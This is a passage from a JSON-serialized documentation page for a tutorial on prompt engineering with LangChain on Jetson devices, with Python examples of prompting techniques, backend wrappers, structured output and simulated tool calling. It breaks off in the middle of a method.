\"\"\"\nYou are a math tutor. Solve this problem step-by-step, explaining your reasoning:\n\nProblem: What is 15% of 240?\n\nPlease:\n1. Explain what the problem is asking\n2. Show the mathematical steps\n3. Verify your answer makes sense\n4. Provide the final answer\n\"\"\"\n\n    return basic_prompt, cot_prompt, advanced_cot\n\n# Test with different models\ndef test_cot_across_models():\n    basic, cot, advanced = demonstrate_chain_of_thought()\n\n    models = {\n        \"OpenAI\": openai_prompter,\n        \"Ollama\": ollama_prompter if ollama_prompter.is_available() else None,\n        # \"LlamaCpp\": llama_prompter  # Uncomment if available\n    }\n\n    for model_name, prompter in models.items():\n        if prompter is None:\n            continue\n\n        print(f\"\\n\ud83d\udd0d {model_name} - Chain of Thought Comparison\")\n        print(\"=\" * 50)\n\n        # Basic prompt\n        if hasattr(prompter, 'simple_prompt'):\n            basic_response = prompter.simple_prompt(basic)\n        else:\n            basic_response = prompter.prompt(basic)\n        print(f\"Basic: {basic_response[:100]}...\")\n\n        # CoT prompt\n        if hasattr(prompter, 'simple_prompt'):\n            cot_response = prompter.simple_prompt(advanced)\n        else:\n            cot_response = prompter.prompt(advanced)\n        print(f\"CoT: {cot_response[:100]}...\")\n\n# Run the test\n# test_cot_across_models()\n</code></pre> <p>Note: These Chain-of-Thought examples are included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run them with: <pre><code>python jetson_prompt_toolkit.py --mode basic --technique cot\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#2-few-shot-learning","title":"\ud83c\udfaf 2. Few-Shot Learning","text":"<p>Provide examples to guide the model's behavior.</p> <pre><code>def demonstrate_few_shot_learning():\n    \"\"\"Show the power of examples in prompting\"\"\"\n\n    # Zero-shot prompt\n    zero_shot = \"Classify the sentiment of this text: 'The Jetson Orin is amazing for AI development!'\"\n\n    # Few-shot prompt with examples\n    few_shot = \"\"\"\nClassify the sentiment of the following texts as Positive, Negative, or Neutral:\n\nExamples:\nText: \"I love using CUDA for parallel computing!\"\nSentiment: Positive\n\nText: \"The installation process was frustrating and took hours.\"\nSentiment: Negative\n\nText: \"The device has 8GB of RAM.\"\nSentiment: Neutral\n\nText: \"This AI model runs incredibly fast on the Jetson!\"\nSentiment: Positive\n\nNow classify this:\nText: \"The Jetson Orin is amazing for AI development!\"\nSentiment:\n\"\"\"\n\n    # Structured few-shot with format specification\n    structured_few_shot = \"\"\"\nYou are a sentiment analysis expert. Classify text sentiment and provide confidence.\n\nFormat your response as: Sentiment: [POSITIVE/NEGATIVE/NEUTRAL] (Confidence: X%)\n\nExamples:\nText: \"CUDA programming is so powerful!\"\nResponse: Sentiment: POSITIVE (Confidence: 95%)\n\nText: \"The setup documentation is unclear.\"\nResponse: Sentiment: NEGATIVE (Confidence: 85%)\n\nText: \"The device weighs 500 grams.\"\nResponse: Sentiment: NEUTRAL (Confidence: 90%)\n\nNow analyze:\nText: \"The Jetson Orin is amazing for AI development!\"\nResponse:\n\"\"\"\n\n    return zero_shot, few_shot, structured_few_shot\n\n# Test few-shot learning\ndef test_few_shot_learning():\n    zero, few, structured = demonstrate_few_shot_learning()\n\n    print(\"\ud83c\udfaf Few-Shot Learning Demonstration\")\n    print(\"=\" * 40)\n\n    # Test with OpenAI\n    print(\"\\n\ud83d\udcdd Zero-shot:\")\n    print(openai_prompter.simple_prompt(zero))\n\n    print(\"\\n\ud83d\udcda Few-shot:\")\n    print(openai_prompter.simple_prompt(few))\n\n    print(\"\\n\ud83c\udfd7\ufe0f Structured few-shot:\")\n    print(openai_prompter.simple_prompt(structured))\n\n# test_few_shot_learning()\n</code></pre> <p>Note: These Few-Shot Learning examples are included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run them with: <pre><code>python jetson_prompt_toolkit.py --mode basic --technique few_shot\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#3-think-step-by-step-vs-think-hard","title":"\ud83d\udd04 3. Think Step by Step vs Think Hard","text":"<p>Compare different reasoning triggers.</p> <pre><code>def compare_reasoning_triggers():\n    \"\"\"Compare different ways to trigger reasoning\"\"\"\n\n    problem = \"A Jetson Orin Nano has 8GB RAM. If an AI model uses 60% of available RAM, and the system reserves 1GB for OS, how much RAM is the model actually using?\"\n\n    prompts = {\n        \"Direct\": problem,\n\n        \"Think Step by Step\": f\"{problem}\\n\\nThink step by step.\",\n\n        \"Think Hard\": f\"{problem}\\n\\nThink hard about this problem.\",\n\n        \"Let's Work Through This\": f\"{problem}\\n\\nLet's work through this systematically:\",\n\n        \"Detailed Analysis\": f\"\"\"\nProblem: {problem}\n\nPlease provide a detailed analysis:\n1. Identify what information we have\n2. Determine what we need to calculate\n3. Show your mathematical work\n4. Verify your answer makes sense\n\"\"\",\n\n        \"Expert Mode\": f\"\"\"\nYou are a computer systems expert. Analyze this memory allocation problem:\n\n{problem}\n\nProvide:\n- Clear breakdown of available vs. used memory\n- Step-by-step calculation\n- Practical implications for AI development\n\"\"\"\n    }\n\n    return prompts\n\ndef test_reasoning_triggers():\n    \"\"\"Test different reasoning approaches\"\"\"\n    prompts = compare_reasoning_triggers()\n\n    print(\"\ud83e\udde0 Reasoning Trigger Comparison\")\n    print(\"=\" * 50)\n\n    for trigger_name, prompt in prompts.items():\n        print(f\"\\n\ud83d\udd0d {trigger_name}:\")\n        print(\"-\" * 30)\n\n        try:\n            response = openai_prompter.simple_prompt(prompt)\n            # Show first 200 characters\n            print(f\"{response[:200]}{'...' if len(response) &gt; 200 else ''}\")\n        except Exception as e:\n            print(f\"Error: {e}\")\n\n        print()  # Add spacing\n\n# test_reasoning_triggers()\n</code></pre> <p>Note: These Reasoning Trigger examples are included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run them with: <pre><code>python jetson_prompt_toolkit.py --mode basic --technique reasoning\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#4-role-based-prompting","title":"\ud83c\udfad 4. Role-Based Prompting","text":"<p>Assign specific roles to get specialized responses.</p> <pre><code>def demonstrate_role_based_prompting():\n    \"\"\"Show how different roles affect responses\"\"\"\n\n    question = \"How should I optimize my deep learning model for deployment on Jetson Orin?\"\n\n    roles = {\n        \"Generic AI\": {\n            \"system\": \"You are a helpful AI assistant.\",\n            \"prompt\": question\n        },\n\n        \"ML Engineer\": {\n            \"system\": \"You are a senior machine learning engineer with 10 years of experience in model optimization and edge deployment.\",\n            \"prompt\": question\n        },\n\n        \"NVIDIA Expert\": {\n            \"system\": \"You are an NVIDIA developer advocate specializing in Jetson platforms, TensorRT optimization, and edge AI deployment.\",\n            \"prompt\": question\n        },\n\n        \"Performance Specialist\": {\n            \"system\": \"You are a performance optimization specialist focused on real-time AI inference on resource-constrained devices.\",\n            \"prompt\": f\"\"\"\n{question}\n\nPlease provide:\n1. Specific optimization techniques\n2. Performance benchmarking approaches\n3. Trade-offs between accuracy and speed\n4. Practical implementation steps\n\"\"\"\n        },\n\n        \"Beginner-Friendly Tutor\": {\n            \"system\": \"You are a patient AI tutor who explains complex concepts in simple terms with practical examples.\",\n            \"prompt\": f\"\"\"\n{question}\n\nPlease explain this in beginner-friendly terms with:\n- Simple explanations of technical concepts\n- Step-by-step guidance\n- Common pitfalls to avoid\n- Practical examples\n\"\"\"\n        }\n    }\n\n    return roles\n\ndef test_role_based_prompting():\n    \"\"\"Test different role assignments\"\"\"\n    roles = demonstrate_role_based_prompting()\n\n    print(\"\ud83c\udfad Role-Based Prompting Comparison\")\n    print(\"=\" * 50)\n\n    for role_name, role_config in roles.items():\n        print(f\"\\n\ud83d\udc64 {role_name}:\")\n        print(\"-\" * 30)\n\n        try:\n            response = openai_prompter.simple_prompt(\n                role_config[\"prompt\"],\n                role_config[\"system\"]\n            )\n            # Show first 300 characters\n            print(f\"{response[:300]}{'...' if len(response) &gt; 300 else ''}\")\n        except Exception as e:\n            print(f\"Error: {e}\")\n\n        print()  # Add spacing\n\n# test_role_based_prompting()\n</code></pre> <p>Note: These Role-Based Prompting examples are included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run them with: <pre><code>python jetson_prompt_toolkit.py --mode basic --technique roles\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#5-in-context-learning","title":"\ud83d\udd04 5. In-Context Learning","text":"<p>Teach the model new tasks within the conversation.</p> <pre><code>def demonstrate_in_context_learning():\n    \"\"\"Show how to teach models new formats/tasks\"\"\"\n\n    # Teaching a custom format for Jetson specs\n    in_context_prompt = \"\"\"\nI'll teach you a format for describing Jetson device specifications:\n\nFormat: [Device] | [GPU] | [CPU] | [RAM] | [Storage] | [Power] | [Use Case]\n\nExamples:\nJetson Nano | 128-core Maxwell GPU | Quad-core ARM A57 | 4GB LPDDR4 | microSD | 5W | IoT/Education\nJetson Xavier NX | 384-core Volta GPU | 6-core Carmel ARM | 8GB LPDDR4x | microSD | 10W | Edge AI\nJetson AGX Orin | 2048-core Ampere GPU | 12-core Cortex-A78AE | 64GB LPDDR5 | NVMe SSD | 60W | Autonomous Vehicles\n\nNow format this device:\nJetson Orin Nano: 1024-core Ampere GPU, 6-core Cortex-A78AE CPU, 8GB LPDDR5 RAM, microSD storage, 15W power consumption, suitable for robotics and edge AI applications.\n\nFormatted specification:\n\"\"\"\n\n    # Teaching code documentation style\n    code_doc_prompt = \"\"\"\nI'll teach you how to document Jetson AI code with our team's style:\n\nStyle: Brief description + Parameters + Example + Performance note\n\nExample 1:\n```python\ndef load_tensorrt_model(engine_path: str) -&gt; trt.ICudaEngine:\n    \"\"\"Load TensorRT engine for optimized inference.\n\n    Args:\n        engine_path: Path to .engine file\n\n    Returns:\n        TensorRT engine ready for inference\n\n    Example:\n        engine = load_tensorrt_model(\"yolo.engine\")\n\n    Performance: ~3x faster than ONNX on Jetson Orin\n    \"\"\"\n</code></pre> <p>Example 2: <pre><code>def preprocess_image(image: np.ndarray, target_size: tuple) -&gt; torch.Tensor:\n    \"\"\"Preprocess image for model inference.\n\n    Args:\n        image: Input image as numpy array\n        target_size: (height, width) for resizing\n\n    Returns:\n        Preprocessed tensor ready for model\n\n    Example:\n        tensor = preprocess_image(img, (640, 640))\n\n    Performance: GPU preprocessing saves 15ms per frame\n    \"\"\"\n</code></pre></p> <p>Now document this function using our style: <pre><code>def optimize_model_for_jetson(model_path: str, precision: str = \"fp16\") -&gt; str:\n    # This function converts PyTorch models to TensorRT for Jetson deployment\n    # It takes a model path and precision setting\n    # Returns path to optimized engine file\n    # Typical speedup is 2-4x on Jetson devices\n</code></pre></p> <p>Documented function: \"\"\"</p> <pre><code>return in_context_prompt, code_doc_prompt\n</code></pre> <p>def test_in_context_learning():     \"\"\"Test in-context learning capabilities\"\"\"     spec_prompt, code_prompt = demonstrate_in_context_learning()</p> <pre><code>print(\"\ud83d\udd04 In-Context Learning Demonstration\")\nprint(\"=\" * 50)\n\nprint(\"\\n\ud83d\udccb Learning Custom Specification Format:\")\nprint(\"-\" * 40)\nresponse1 = openai_prompter.simple_prompt(spec_prompt)\nprint(response1)\n\nprint(\"\\n\ud83d\udcbb Learning Code Documentation Style:\")\nprint(\"-\" * 40)\nresponse2 = openai_prompter.simple_prompt(code_prompt)\nprint(response2)\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#test_in_context_learning","title":"test_in_context_learning()","text":"<pre><code>&gt; **Note:** These In-Context Learning examples are included in the unified `jetson_prompt_toolkit.py` script. You can run them with:\n&gt; ```bash\n&gt; python jetson_prompt_toolkit.py --mode basic --technique in_context\n&gt; ```\n\n---\n\n## \ud83d\udd17 Introduction to LangChain\n\nLangChain is a powerful framework that simplifies building applications with Large Language Models (LLMs). It provides abstractions for prompt management, model integration, and complex workflows.\n\n### \ud83c\udf1f Why LangChain for Prompt Engineering?\n\n1. **Model Agnostic**: Switch between OpenAI, Ollama, and local models seamlessly\n2. **Prompt Templates**: Reusable, parameterized prompts\n3. **Chain Composition**: Combine multiple prompts and models\n4. **Memory Management**: Maintain conversation context\n5. **Output Parsing**: Structure model responses automatically\n\n### \ud83d\udce6 Installation for Jetson\n\n```bash\n# Core LangChain\npip install langchain langchain-community\n\n# For OpenAI integration\npip install langchain-openai\n\n# For local model support\npip install langchain-ollama\n\n# For structured output\npip install pydantic\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#langchain-with-openai","title":"\ud83d\udd39 LangChain with OpenAI","text":"<pre><code>from langchain_openai import ChatOpenAI\nfrom langchain.prompts import ChatPromptTemplate\nfrom langchain.schema import HumanMessage, SystemMessage\n\nclass LangChainOpenAIPrompter:\n    def __init__(self, api_key: str, model: str = \"gpt-3.5-turbo\"):\n        self.llm = ChatOpenAI(\n            api_key=api_key,\n            model=model,\n            temperature=0.7\n        )\n\n    def simple_prompt(self, prompt: str, system_message: str = None) -&gt; str:\n        \"\"\"Simple prompting with optional system message\"\"\"\n        messages = []\n        if system_message:\n            messages.append(SystemMessage(content=system_message))\n        messages.append(HumanMessage(content=prompt))\n\n        response = self.llm.invoke(messages)\n        return response.content\n\n    def template_prompt(self, template: str, **kwargs) -&gt; str:\n        \"\"\"Use prompt templates for reusable prompts\"\"\"\n        prompt_template = ChatPromptTemplate.from_template(template)\n        formatted_prompt = prompt_template.format(**kwargs)\n\n        response = self.llm.invoke([HumanMessage(content=formatted_prompt)])\n        return response.content\n\n    def chain_prompts(self, prompts: list) -&gt; list:\n        \"\"\"Chain multiple prompts together\"\"\"\n        results = []\n        context = \"\"\n\n        for i, prompt in enumerate(prompts):\n            if i &gt; 0:\n                full_prompt = f\"Previous context: {context}\\n\\nNew task: {prompt}\"\n            else:\n                full_prompt = prompt\n\n            response = self.simple_prompt(full_prompt)\n            results.append(response)\n            context = response[:200]  # Keep context manageable\n\n        return results\n\n# Example usage\nlangchain_openai = LangChainOpenAIPrompter(\"your-api-key\")\n\n# Template example\njetson_template = \"\"\"\nYou are a Jetson AI expert. Explain {concept} for {audience} level.\nFocus on {platform} platform specifics.\nProvide {num_examples} practical examples.\n\"\"\"\n\nresponse = langchain_openai.template_prompt(\n    jetson_template,\n    concept=\"TensorRT optimization\",\n    audience=\"intermediate\",\n    platform=\"Jetson Orin Nano\",\n    num_examples=\"3\"\n)\nprint(response)\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#langchain-with-local-ollama","title":"\ud83d\udd39 LangChain with Local Ollama","text":"<pre><code>from langchain_ollama import ChatOllama\nfrom langchain.prompts import ChatPromptTemplate\nfrom langchain.schema import HumanMessage, SystemMessage\n\nclass LangChainOllamaPrompter:\n    def __init__(self, model: str = \"llama3.1:8b\", base_url: str = \"http://localhost:11434\"):\n        self.llm = ChatOllama(\n            model=model,\n            base_url=base_url,\n            temperature=0.7\n        )\n\n    def is_available(self) -&gt; bool:\n        \"\"\"Check if Ollama is running\"\"\"\n        try:\n            import requests\n            response = requests.get(f\"{self.llm.base_url}/api/tags\", timeout=5)\n            return response.status_code == 200\n        except:\n            return False\n\n    def simple_prompt(self, prompt: str, system_message: str = None) -&gt; str:\n        \"\"\"Simple prompting with optional system message\"\"\"\n        messages = []\n        if system_message:\n            messages.append(SystemMessage(content=system_message))\n        messages.append(HumanMessage(content=prompt))\n\n        response = self.llm.invoke(messages)\n        return response.content\n\n    def streaming_prompt(self, prompt: str):\n        \"\"\"Stream response for long outputs\"\"\"\n        for chunk in self.llm.stream([HumanMessage(content=prompt)]):\n            yield chunk.content\n\n    def batch_prompts(self, prompts: list) -&gt; list:\n        \"\"\"Process multiple prompts efficiently\"\"\"\n        messages_list = [[HumanMessage(content=prompt)] for prompt in prompts]\n        responses = self.llm.batch(messages_list)\n        return [response.content for response in responses]\n\n# Example usage\nlangchain_ollama = LangChainOllamaPrompter()\n\nif langchain_ollama.is_available():\n    # Streaming example\n    print(\"\ud83d\udd04 Streaming response:\")\n    for chunk in langchain_ollama.streaming_prompt(\n        \"Explain how to optimize YOLO models for Jetson Orin in detail\"\n    ):\n        print(chunk, end=\"\", flush=True)\n\n    # Batch processing\n    jetson_questions = [\n        \"What is the difference between Jetson Nano and Orin?\",\n        \"How to install PyTorch on Jetson?\",\n        \"Best practices for TensorRT optimization?\"\n    ]\n\n    batch_responses = langchain_ollama.batch_prompts(jetson_questions)\n    for q, a in zip(jetson_questions, batch_responses):\n        print(f\"Q: {q}\")\n        print(f\"A: {a[:100]}...\\n\")\n</code></pre> <p>Note: This LangChain Ollama integration is included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run it with: <pre><code>python jetson_prompt_toolkit.py --mode compare --backends ollama\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#langchain-with-llama-cpp-python","title":"\ud83d\udd39 LangChain with llama-cpp-python","text":"<pre><code>from langchain_community.llms import LlamaCpp\nfrom langchain.prompts import PromptTemplate\nfrom langchain.callbacks.manager import CallbackManager\nfrom langchain.callbacks.streaming_stdout import StreamingStdOutCallbackHandler\n\nclass LangChainLlamaCppPrompter:\n    def __init__(self, model_path: str, n_gpu_layers: int = 80):\n        # Callback for streaming\n        callback_manager = CallbackManager([StreamingStdOutCallbackHandler()])\n\n        self.llm = LlamaCpp(\n            model_path=model_path,\n            n_gpu_layers=n_gpu_layers,\n            temperature=0.7,\n            max_tokens=2000,\n            top_p=1,\n            callback_manager=callback_manager,\n            verbose=False,\n        )\n\n    def simple_prompt(self, prompt: str, system_message: str = None) -&gt; str:\n        \"\"\"Simple prompting with optional system message\"\"\"\n        if system_message:\n            full_prompt = f\"System: {system_message}\\n\\nHuman: {prompt}\\n\\nAssistant:\"\n        else:\n            full_prompt = f\"Human: {prompt}\\n\\nAssistant:\"\n\n        response = self.llm.invoke(full_prompt)\n        return response\n\n    def template_prompt(self, template: str, **kwargs) -&gt; str:\n        \"\"\"Use prompt templates\"\"\"\n        prompt_template = PromptTemplate.from_template(template)\n        formatted_prompt = prompt_template.format(**kwargs)\n\n        response = self.llm.invoke(formatted_prompt)\n        return response\n\n    def conversation_prompt(self, messages: list) -&gt; str:\n        \"\"\"Handle conversation format\"\"\"\n        conversation = \"\"\n        for msg in messages:\n            role = msg.get(\"role\", \"user\")\n            content = msg.get(\"content\", \"\")\n\n            if role == \"system\":\n                conversation += f\"System: {content}\\n\\n\"\n            elif role == \"user\":\n                conversation += f\"Human: {content}\\n\\n\"\n            elif role == \"assistant\":\n                conversation += f\"Assistant: {content}\\n\\n\"\n\n        conversation += \"Assistant:\"\n        response = self.llm.invoke(conversation)\n        return response\n\n# Example usage (uncomment when model is available)\n# langchain_llamacpp = LangChainLlamaCppPrompter(\"/path/to/model.gguf\")\n\n# Conversation example\n# conversation = [\n#     {\"role\": \"system\", \"content\": \"You are a Jetson AI expert.\"},\n#     {\"role\": \"user\", \"content\": \"How do I optimize models for Jetson?\"},\n#     {\"role\": \"assistant\", \"content\": \"There are several key approaches...\"},\n#     {\"role\": \"user\", \"content\": \"Tell me more about TensorRT specifically.\"}\n# ]\n# \n# response = langchain_llamacpp.conversation_prompt(conversation)\n# print(response)\n</code></pre> <p>Note: This LangChain LlamaCpp integration is included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run it with: <pre><code>python jetson_prompt_toolkit.py --mode compare --backends llamacpp --model_path /path/to/your/model.gguf\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#comparing-langchain-approaches","title":"\ud83d\udd04 Comparing LangChain Approaches","text":"<pre><code>def compare_langchain_backends():\n    \"\"\"Compare the same prompt across different LangChain backends\"\"\"\n\n    prompt = \"\"\"\nExplain the key differences between these Jetson optimization techniques:\n1. TensorRT optimization\n2. CUDA kernel optimization\n3. Memory management optimization\n\nProvide practical examples for each.\n\"\"\"\n\n    backends = {\n        \"OpenAI (GPT-3.5)\": langchain_openai,\n        \"Ollama (Local)\": langchain_ollama if langchain_ollama.is_available() else None,\n        # \"LlamaCpp (Local)\": langchain_llamacpp  # Uncomment if available\n    }\n\n    print(\"\ud83d\udd04 LangChain Backend Comparison\")\n    print(\"=\" * 50)\n\n    for backend_name, backend in backends.items():\n        if backend is None:\n            print(f\"\\n\u274c {backend_name}: Not available\")\n            continue\n\n        print(f\"\\n\ud83d\udd0d {backend_name}:\")\n        print(\"-\" * 30)\n\n        try:\n            import time\n            start_time = time.time()\n            response = backend.simple_prompt(prompt)\n            end_time = time.time()\n\n            print(f\"Response time: {end_time - start_time:.2f}s\")\n            print(f\"Response: {response[:200]}...\")\n        except Exception as e:\n            print(f\"Error: {e}\")\n\n        print()\n\n# compare_langchain_backends()\n</code></pre> <p>Note: This LangChain backend comparison is included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run it with: <pre><code>python jetson_prompt_toolkit.py --mode compare\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#structured-output-with-langchain","title":"\ud83c\udfd7\ufe0f Structured Output with LangChain","text":"<p>LangChain excels at converting unstructured LLM responses into structured data using Pydantic models.</p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#basic-structured-output","title":"\ud83d\udccb Basic Structured Output","text":"<pre><code>from pydantic import BaseModel, Field\nfrom typing import List, Optional\nfrom langchain.output_parsers import PydanticOutputParser\nfrom langchain.prompts import PromptTemplate\n\nclass JetsonOptimizationPlan(BaseModel):\n    \"\"\"Structured plan for Jetson model optimization\"\"\"\n    model_name: str = Field(description=\"Name of the AI model\")\n    current_performance: dict = Field(description=\"Current FPS and latency metrics\")\n    optimization_steps: List[str] = Field(description=\"List of optimization techniques to apply\")\n    expected_improvement: dict = Field(description=\"Expected performance gains\")\n    estimated_time: str = Field(description=\"Time required for optimization\")\n    difficulty_level: str = Field(description=\"Beginner, Intermediate, or Advanced\")\n    required_tools: List[str] = Field(description=\"Tools and libraries needed\")\n\nclass JetsonDeviceComparison(BaseModel):\n    \"\"\"Structured comparison of Jetson devices\"\"\"\n    device_name: str = Field(description=\"Jetson device name\")\n    gpu_cores: int = Field(description=\"Number of GPU cores\")\n    cpu_cores: int = Field(description=\"Number of CPU cores\")\n    ram_gb: int = Field(description=\"RAM in GB\")\n    power_consumption: str = Field(description=\"Power consumption\")\n    best_use_cases: List[str] = Field(description=\"Recommended use cases\")\n    price_range: str = Field(description=\"Approximate price range\")\n\ndef create_structured_prompter():\n    \"\"\"Create a prompter that returns structured data\"\"\"\n\n    class StructuredPrompter:\n        def __init__(self, llm):\n            self.llm = llm\n\n        def get_optimization_plan(self, model_description: str) -&gt; JetsonOptimizationPlan:\n            \"\"\"Get a structured optimization plan\"\"\"\n            parser = PydanticOutputParser(pydantic_object=JetsonOptimizationPlan)\n\n            prompt = PromptTemplate(\n                template=\"\"\"\nYou are a Jetson optimization expert. Create a detailed optimization plan for the following model:\n\nModel Description: {model_description}\n\nProvide a comprehensive optimization strategy.\n\n{format_instructions}\n\"\"\",\n                input_variables=[\"model_description\"],\n                partial_variables={\"format_instructions\": parser.get_format_instructions()}\n            )\n\n            formatted_prompt = prompt.format(model_description=model_description)\n            response = self.llm.invoke(formatted_prompt)\n\n            try:\n                return parser.parse(response)\n            except Exception as e:\n                print(f\"Parsing error: {e}\")\n                print(f\"Raw response: {response}\")\n                return None\n\n        def compare_jetson_devices(self, devices: List[str]) -&gt; List[JetsonDeviceComparison]:\n            \"\"\"Get structured comparison of Jetson devices\"\"\"\n            parser = PydanticOutputParser(pydantic_object=JetsonDeviceComparison)\n\n            results = []\n            for device in devices:\n                prompt = PromptTemplate(\n                    template=\"\"\"\nProvide detailed specifications and information about the {device}.\n\nInclude technical specs, performance characteristics, and recommended use cases.\n\n{format_instructions}\n\"\"\",\n                    input_variables=[\"device\"],\n                    partial_variables={\"format_instructions\": parser.get_format_instructions()}\n                )\n\n                formatted_prompt = prompt.format(device=device)\n                response = self.llm.invoke(formatted_prompt)\n\n                try:\n                    parsed_result = parser.parse(response)\n                    results.append(parsed_result)\n                except Exception as e:\n                    print(f\"Parsing error for {device}: {e}\")\n                    continue\n\n            return results\n\n    return StructuredPrompter\n\n# Example usage\nStructuredPrompter = create_structured_prompter()\nstructured_prompter = StructuredPrompter(langchain_openai.llm)\n\n# Get optimization plan\nmodel_desc = \"YOLOv8 object detection model, currently running at 15 FPS on Jetson Orin Nano, need to achieve 30 FPS for real-time application\"\noptimization_plan = structured_prompter.get_optimization_plan(model_desc)\n\nif optimization_plan:\n    print(\"\ud83c\udfd7\ufe0f Structured Optimization Plan:\")\n    print(f\"Model: {optimization_plan.model_name}\")\n    print(f\"Current Performance: {optimization_plan.current_performance}\")\n    print(f\"Steps: {optimization_plan.optimization_steps}\")\n    print(f\"Expected Improvement: {optimization_plan.expected_improvement}\")\n    print(f\"Difficulty: {optimization_plan.difficulty_level}\")\n\n# Compare devices\njetson_devices = [\"Jetson Nano\", \"Jetson Orin Nano\", \"Jetson AGX Orin\"]\ndevice_comparisons = structured_prompter.compare_jetson_devices(jetson_devices)\n\nprint(\"\\n\ud83d\udcca Device Comparison:\")\nfor device in device_comparisons:\n    print(f\"\\n{device.device_name}:\")\n    print(f\"  GPU Cores: {device.gpu_cores}\")\n    print(f\"  RAM: {device.ram_gb}GB\")\n    print(f\"  Power: {device.power_consumption}\")\n    print(f\"  Use Cases: {', '.join(device.best_use_cases[:2])}\")\n</code></pre> <p>Note: This Structured Output example is included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run it with: <pre><code>python jetson_prompt_toolkit.py --mode structured\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#tool-calling-with-structured-output","title":"\ud83d\udee0\ufe0f Tool Calling with Structured Output","text":"<p>Enable LLMs to call external tools and functions through structured prompting.</p> <pre><code>from pydantic import BaseModel, Field\nfrom typing import List, Optional, Literal\nimport json\nimport subprocess\nimport psutil\n\nclass ToolCall(BaseModel):\n    \"\"\"Represents a tool call request\"\"\"\n    tool_name: str = Field(description=\"Name of the tool to call\")\n    parameters: dict = Field(description=\"Parameters for the tool\")\n    reasoning: str = Field(description=\"Why this tool is needed\")\n\nclass JetsonSystemInfo(BaseModel):\n    \"\"\"System information tool result\"\"\"\n    gpu_memory_used: float = Field(description=\"GPU memory usage in MB\")\n    cpu_usage: float = Field(description=\"CPU usage percentage\")\n    temperature: float = Field(description=\"System temperature in Celsius\")\n    available_models: List[str] = Field(description=\"Available AI models\")\n\nclass ModelBenchmark(BaseModel):\n    \"\"\"Model benchmarking tool result\"\"\"\n    model_name: str = Field(description=\"Name of the benchmarked model\")\n    fps: float = Field(description=\"Frames per second\")\n    latency_ms: float = Field(description=\"Latency in milliseconds\")\n    memory_usage_mb: float = Field(description=\"Memory usage in MB\")\n    accuracy: Optional[float] = Field(description=\"Model accuracy if available\")\n\nclass JetsonToolkit:\n    \"\"\"Collection of Jetson-specific tools\"\"\"\n\n    @staticmethod\n    def get_system_info() -&gt; JetsonSystemInfo:\n        \"\"\"Get current Jetson system information\"\"\"\n        try:\n            # Simulate getting GPU memory (would use actual NVIDIA tools)\n            gpu_memory = 2048.5  # MB\n            cpu_usage = psutil.cpu_percent()\n            temperature = 45.2  # Would read from thermal sensors\n\n            # Simulate available models\n            available_models = [\"yolov8n.engine\", \"resnet50.onnx\", \"mobilenet.trt\"]\n\n            return JetsonSystemInfo(\n                gpu_memory_used=gpu_memory,\n                cpu_usage=cpu_usage,\n                temperature=temperature,\n                available_models=available_models\n            )\n        except Exception as e:\n            print(f\"Error getting system info: {e}\")\n            return None\n\n    @staticmethod\n    def benchmark_model(model_path: str, input_size: tuple = (640, 640)) -&gt; ModelBenchmark:\n        \"\"\"Benchmark a model on Jetson\"\"\"\n        try:\n            # Simulate benchmarking (would run actual inference)\n            model_name = model_path.split('/')[-1]\n\n            # Simulate results based on model type\n            if \"yolo\" in model_name.lower():\n                fps = 28.5\n                latency = 35.1\n                memory = 1024.0\n            elif \"resnet\" in model_name.lower():\n                fps = 45.2\n                latency = 22.1\n                memory = 512.0\n            else:\n                fps = 60.0\n                latency = 16.7\n                memory = 256.0\n\n            return ModelBenchmark(\n                model_name=model_name,\n                fps=fps,\n                latency_ms=latency,\n                memory_usage_mb=memory,\n                accuracy=0.85\n            )\n        except Exception as e:\n            print(f\"Error benchmarking model: {e}\")\n            return None\n\n    @staticmethod\n    def optimize_model(model_path: str, target_precision: str = \"fp16\") -&gt; dict:\n        \"\"\"Optimize a model for Jetson deployment\"\"\"\n        try:\n            # Simulate optimization process\n            optimization_result = {\n                \"status\": \"success\",\n                \"original_size_mb\": 245.6,\n                \"optimized_size_mb\": 123.2,\n                \"speedup_factor\": 2.3,\n                \"output_path\": f\"/opt/models/optimized_{model_path.split('/')[-1]}\",\n                \"optimization_time_seconds\": 45.2\n            }\n            return optimization_result\n        except Exception as e:\n            return {\"status\": \"error\", \"message\": str(e)}\n\nclass ToolCallingPrompter:\n    \"\"\"LLM prompter with tool calling capabilities\"\"\"\n\n    def __init__(self, llm):\n        self.llm = llm\n        self.toolkit = JetsonToolkit()\n\n        # Define available tools\n        self.available_tools = {\n            \"get_system_info\": {\n                \"description\": \"Get current Jetson system information including GPU memory, CPU usage, and temperature\",\n                \"parameters\": {},\n                \"returns\": \"JetsonSystemInfo object\"\n            },\n            \"benchmark_model\": {\n                \"description\": \"Benchmark an AI model on Jetson to measure performance\",\n                \"parameters\": {\n                    \"model_path\": \"Path to the model file\",\n                    \"input_size\": \"Input size as (height, width) tuple, default (640, 640)\"\n                },\n                \"returns\": \"ModelBenchmark object with FPS, latency, and memory usage\"\n            },\n            \"optimize_model\": {\n                \"description\": \"Optimize a model for Jetson deployment using TensorRT\",\n                \"parameters\": {\n                    \"model_path\": \"Path to the model file\",\n                    \"target_precision\": \"Target precision: fp32, fp16, or int8\"\n                },\n                \"returns\": \"Dictionary with optimization results\"\n            }\n        }\n\n    def create_tool_calling_prompt(self, user_request: str) -&gt; str:\n        